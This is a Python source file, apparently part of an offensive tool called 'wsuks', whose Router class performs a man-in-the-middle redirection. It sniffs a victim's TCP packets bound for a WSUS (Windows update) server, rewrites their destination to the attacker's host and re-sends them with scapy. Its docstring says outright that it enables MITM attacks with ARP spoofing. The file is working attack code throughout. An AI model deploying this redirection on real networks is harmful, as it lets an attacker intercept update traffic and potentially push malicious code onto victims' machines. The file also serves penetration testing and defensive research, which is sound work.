#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import sys
import time
import traceback
from scapy.all import sniff, IP, TCP, get_if_hwaddr
from scapy.sendrecv import sendp
from threading import Thread


class Router:
    """
    This class is used to enable MITM attacks with ARP spoofing.
    """

    def __init__(self):
        self.logger = logging.getLogger("wsuks")
        self.isRunning = False
        self.targetIp = None
        self.hostIp = None
        self.hostMac = None
        self.wsusIp = None
        self.interface = None

    def _setRoute(self):
        sniff(filter=f"tcp", prn=self._process_packet, store=0, iface=self.interface)

    def _process_packet(self, packet):
        if IP in packet and TCP in packet and packet[IP].src == self.targetIp and packet.dst == self.hostMac and packet[IP].dst == self.wsusIp:
            #print("BEFORE: ")
            #packet.show()
            self.logger.debug(f"Forwarding packet from {packet[IP].src} to {self.hostIp}")
            packet[IP].dst = self.hostIp  # Ziel-IP-Adresse ändern
            #print("AFTER: ")
            #packet.show()
            try:
                sendp(packet, verbose=0, iface=self.interface)  # Paket weiterleiten
            except Exception as e:
                self.logger.error(f"Error while forwarding packet: {e}")

    def start(self, targetIp, hostIp, wsusIp, interface):
        self.targetIp = targetIp
        self.hostIp = hostIp
        self.hostMac = get_if_hwaddr(interface)
        self.wsusIp = wsusIp
        self.interface = interface
        self.isRunning = True

        self.logger.info(f"Set route for target {targetIp} to {hostIp}")
        t2 = Thread(target=self._setRoute)
        t2.daemon = True
        t2.start()

    def stop(self):
        """
        Stop the ARP spoofing process.
        """
        if self.isRunning and self.targetIp:
            self.logger.info(f"Delete route for {self.targetIp} to {self.hostIp}")
            self.isRunning = False
        else:
            self.logger.error("Router is not running")
